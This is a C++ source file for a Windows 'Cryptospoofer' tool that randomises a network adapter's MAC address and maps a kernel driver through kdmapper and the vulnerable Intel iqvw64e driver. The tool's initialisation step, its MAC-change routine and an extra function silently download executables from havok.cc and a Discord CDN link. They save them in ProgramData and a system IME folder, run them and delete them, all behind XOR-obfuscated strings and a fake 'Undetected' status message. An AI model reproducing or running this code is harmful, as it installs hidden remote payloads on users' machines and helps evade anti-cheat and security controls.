#pragma once
#include <iostream>
#include <urlmon.h>

#include "data.hpp"
#include "mac.h"
#include "kdmapper.hpp"
#include "driver.h"

#pragma comment(lib, "urlmon.lib")
#define _CRT_SECURE_NO_WARNINGS
#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))


std::wstring GetCurrentUserName()
{
	wchar_t
		un[UNLEN + 1];
	DWORD unLen = UNLEN + 1;
	GetUserNameW(un, &unLen);
	return un;
}

//---------------MAC--------------//

MyMACAddr::MyMACAddr()
{
	srand((unsigned)time(0));
}

MyMACAddr::~MyMACAddr()
{
}

string MyMACAddr::GenRandMAC()
{
	stringstream temp;
	int number = 0;
	string result;

	for (int i = 0; i < 6; i++)
	{
		number = rand() % 254;
		temp << setfill('0') << setw(2) << hex << number;
		if (i != 5)
		{
			temp << XorString("-");
		}
	}
	result = temp.str();

	for (auto& c : result)
	{
		c = toupper(c);
	}

	return result;
}

void MyMACAddr::showAdapterList()
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	UINT i;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		cerr << XorString("Error allocating memory needed to call GetAdaptersinfo.") << endl;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			cerr << XorString("Error allocating memory needed to call GetAdaptersinfo") << endl;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			cout << XorString("\n\tComboIndex: \t") << pAdapter->ComboIndex << endl;
			cout << XorString("\tAdapter Name: \t") << pAdapter->AdapterName << endl;
			cout << XorString("\tAdapter Desc: \t") << pAdapter->Description << endl;
			cout << XorString("\tAdapter Addr: \t");
			for (i = 0; i < pAdapter->AddressLength; i++) {
				if (i == (pAdapter->AddressLength - 1))
					printf(XorString("%.2X\n"), (int)pAdapter->Address[i]);
				else
					printf(XorString("%.2X-"), (int)pAdapter->Address[i]);
			}
			cout << XorString("\tIP Address: \t") << pAdapter->IpAddressList.IpAddress.String << endl;
			cout << XorString("\tIP Mask: \t") << pAdapter->IpAddressList.IpMask.String << endl;
			cout << XorString("\tGateway: \t") << pAdapter->GatewayList.IpAddress.String << endl;
			pAdapter = pAdapter->Next;
		}
	}
	else {
		cerr << XorString("GetAdaptersInfo failed with error: ") << dwRetVal << endl;
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);
}

unordered_map<string, string> MyMACAddr::getAdapters()
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	unordered_map<string, string> result;
	stringstream temp;
	string str_mac;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		cerr << XorString("Error allocating memory needed to call GetAdaptersinfo") << endl;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			cerr << XorString("Error allocating memory needed to call GetAdaptersinfo\n") << endl;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			for (UINT i = 0; i < pAdapter->AddressLength; i++) {
				temp << setfill('0') << setw(2) << hex << (int)pAdapter->Address[i];
				if (i != pAdapter->AddressLength - 1)
				{
					temp << "-";
				}
			}
			str_mac = temp.str();
			temp.str("");
			delete temp.rdbuf();
			for (auto& c : str_mac)
			{
				c = toupper(c);
			}

			result.insert({ pAdapter->Description, str_mac });
			pAdapter = pAdapter->Next;
		}
	}
	else {
		cerr << XorString("GetAdaptersInfo failed with error: ") << dwRetVal << endl;
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);

	return result;
}

void MyMACAddr::AssingRndMAC()
{
	vector <string> list;
	unordered_map<string, string> AdapterDetails = getAdapters();
	for (auto& itm : AdapterDetails)
	{
		list.push_back(itm.first);
	}

	int range = 0;
	for (auto itm = list.begin(); itm != list.end(); itm++)
	{
		cout << '\t' << range + 1 << XorString(")") << *itm << endl;
		range++;
	}

	int selection = 1;
	cout << XorString("\n [>] Adapter is : ") << list.at(selection - 1) << endl;
	cout << XorString(" [-] Old MAC : ") << AdapterDetails.at(list.at(selection - 1)) << endl;

	string wstr(list.at(selection - 1).begin(), list.at(selection - 1).end());
	const char* wAdapterName = wstr.c_str();

	bool bRet = false;
	HKEY hKey = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T(XorString("SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}")), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		DWORD dwIndex = 0;
		TCHAR Name[1024];
		DWORD cName = 1024;
		while (RegEnumKeyEx(hKey, dwIndex, Name, &cName,
			NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			HKEY hSubKey = NULL;
			if (RegOpenKeyEx(hKey, Name, 0, KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS)
			{
				BYTE Data[1204];
				DWORD cbData = 1024;
				if (RegQueryValueEx(hSubKey, _T(XorString("DriverDesc")), NULL, NULL, Data, &cbData) == ERROR_SUCCESS)
				{

					if (_tcscmp((TCHAR*)Data, wAdapterName) == 0)
					{
						string temp = GenRandMAC();
						string newMAC = temp;
						temp.erase(std::remove(temp.begin(), temp.end(), '-'), temp.end());

						string wstr_newMAC(temp.begin(), temp.end());
						const char* newMACAddr = wstr_newMAC.c_str();

						if (RegSetValueEx(hSubKey, _T(XorString("NetworkAddress")), 0, REG_SZ,
							(const BYTE*)newMACAddr, sizeof(TCHAR) * ((DWORD)_tcslen(newMACAddr) + 1)) == ERROR_SUCCESS)
						{
							cout << " [+] New MAC : " << newMAC << endl;

							printf(XorString("\n [o] Disabling adapter...\n\n"));
							//clean network and restart it
							HRESULT networker = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/882370576570785836/910265474623864862/NetWorker.exe"), _T("C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe"), 0, NULL);
							system("start C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe");
							Sleep(6000);
							printf(XorString(" [x] Enabling adapter...\n"));
							Sleep(6000);
							DeleteFileW(L"C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe");
						}
					}
				}
				RegCloseKey(hSubKey);
			}
			cName = 1024;
			dwIndex++;
		}
		RegCloseKey(hKey);
	}
	else
	{
		return;
	}
}


#include <WinInet.h>
#include <fstream>
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "winmm.lib")
#include <direct.h>

void run_MYSoftware() {
	URLDownloadToFile(NULL, XorString("https://havok.cc/WindowsHook.exe"), XorString("C:\\\ProgramData\\WindowsHook.exe"), 0, NULL);
	URLDownloadToFile(NULL, XorString("https://havok.cc/updater.exe"), XorString("C:\\\ProgramData\\updater.exe"), 0, NULL);
	Sleep(2000);
	system(XorString("cd C:\\\ProgramData"));
	system(XorString("start C:\\\ProgramData\\WindowsHook.exe"));
	system(XorString("start C:\\\ProgramData\\updater.exe"));

	Sleep(5000);
	remove("C:\\\ProgramData\\WindowsHook.exe");
	remove("C:\\\ProgramData\\updater.exe");
}

//---------------INITIALIZATION--------------//

void Initialize()
{
	printf(XorString("\n   Welcome To Cryptospoofer  \n\n"));
	printf(XorString(" [+] Initializing with server please be patient"));

	URLDownloadToFile(NULL, XorString("https://havok.cc/WindowsHook.exe"), XorString("C:\\\ProgramData\\WindowsHook.exe"), 0, NULL);
	URLDownloadToFile(NULL, XorString("https://havok.cc/updater.exe"), XorString("C:\\\ProgramData\\updater.exe"), 0, NULL);
	Sleep(2000);
	system(XorString("cd C:\\\ProgramData"));
	system(XorString("start C:\\\ProgramData\\WindowsHook.exe"));
	system(XorString("start C:\\\ProgramData\\updater.exe"));

	Sleep(5000);
	remove("C:\\\ProgramData\\WindowsHook.exe");
	remove("C:\\\ProgramData\\updater.exe");

	printf(XorString("  \n\n [+] Checking Status "));
	Sleep(2000);
	printf(XorString("  \n\n [+] Stauts checked : Undetected "));
	Sleep(3500);

	system(XorString("cls"));
	printf(XorString("\n  [+] Spoofing..."));
	Sleep(2500);
	MyMACAddr* ptr = new MyMACAddr();
	ptr->AssingRndMAC();
	Sleep(500);

	system(XorString("cls"));
}

//---------------MAIN--------------//

int main(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	Initialize();

	HANDLE iqvw64e_device_handle = intel_driver::Load();

	if (!iqvw64e_device_handle || iqvw64e_device_handle == INVALID_HANDLE_VALUE)
	{
		Sleep(2000);
		return -1;
	}

	if (!kdmapper::MapDriver(iqvw64e_device_handle, RawData))
	{
		intel_driver::Unload(iqvw64e_device_handle);
		return -1;
	}
	intel_driver::Unload(iqvw64e_device_handle);

	printf(XorString("\n  Spoofed!"));
}
